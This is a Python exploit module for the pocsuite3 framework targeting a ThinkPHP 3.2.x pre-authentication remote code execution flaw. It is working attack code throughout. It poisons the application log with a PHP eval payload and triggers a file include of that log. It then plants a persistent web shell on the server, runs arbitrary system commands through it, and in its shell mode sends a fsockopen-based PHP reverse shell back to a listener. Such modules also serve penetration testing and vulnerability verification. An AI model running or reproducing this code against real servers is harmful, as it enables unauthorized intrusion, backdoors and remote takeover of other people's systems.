#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import datetime
import hashlib
import urllib
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import (
    Output, POCBase, register_poc, logger, requests,
    get_listener_ip, get_listener_port
)


class TestPOC(POCBase):
    vulID = '99297'
    version = '1.0'
    author = ['fengqi']
    vulDate = '2021-07-15'
    createDate = '2021-07-15'
    updateDate = '2021-07-15'
    references = ['https://www.seebug.org/vuldb/ssvid-99297']
    name = 'thinkphp 3.2.x pre-auth rce'
    appPowerLink = 'http://www.thinkphp.cn'
    appName = 'thinkphp'
    appVersion = '3.2.x'
    vulType = 'rce'
    desc = ''
    samples = ['']
    install_requires = []

    def _check(self):
        self.url = self.url.rstrip('/')
        res = requests.get(
            self.url,
            timeout=10,
            verify=False,
        )
        return (
            'thinkphp' in res.text.lower() or
            'thinkphp' in str(res.headers).lower()
        )

    def _rce(self):
        self.ip = self.url.split('://')[-1].split('/')[0].split(':')[0]
        salt = '0u0bR8AynSQNVR066'
        m = hashlib.md5()
        m.update((self.ip + salt).encode())
        self.sn = '%s.php' % m.hexdigest()[0:10]
        flag = random_str(10)
        res = self._exec(code=f'echo {flag}')
        if flag in res:
            return True

        # inject php code to log
        uri = (
            f'{self.url}/index.php'
            '?m=--><?=@eval($_POST[x]);?>'
        )
        try:
            urllib.request.urlopen(uri)
        except Exception:
            pass

        # trigger file include
        filename = datetime.date.today().strftime('%Y_%m_%d.log')[2:]
        filename = f'./Application/Runtime/Logs/Common/{filename}'
        uri = (
            f'{self.url}/index.php?'
            f'm=Home&c=Index&a=index&value[_filename]={filename}'
        )
        data = {
            'x':
            f'file_put_contents("{self.sn}", "<?php @eval(\$_POST[x]);?>");'
        }
        res = requests.post(
            uri,
            timeout=5,
            data=data,
            verify=False
        )
        res = self._exec(code=f'echo {flag}')
        return flag in res

    def _exec(self, cmd='', code=''):
        if cmd:
            code = f'system(\'{cmd}\');'
        data = {
            'x': f'{code};'
        }
        try:
            res = requests.post(
                f'{self.url}/{self.sn}',
                data=data,
                timeout=10,
                verify=False
            )
            result = res.text
            logger.debug(result)
        except Exception:
            pass
        return result

    def _verify(self):
        result = {}
        if not (self._check() and self._rce()):
            return self.parse_output(result)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('uname -a', description='The command to execute')
        return o

    def _attack(self):
        result = {}
        if not (self._check() and self._rce()):
            return self.parse_output(result)
        cmd = self.get_option('cmd')
        res = self._exec(cmd=cmd)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][cmd] = res
        return self.parse_output(result)

    def _shell(self):
        if not (self._check() and self._rce()):
            return self.parse_output({})
        ip, port = get_listener_ip(), get_listener_port()
        reverse_shell_code = (
            f'$f=@fsockopen("{ip}",{port});'
            'while(!feof($f)){$c=fgets($f);fputs($f,`$c`);}'
            'fclose($f);'
        )
        self._exec(code=reverse_shell_code)
        return self.parse_output({})

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
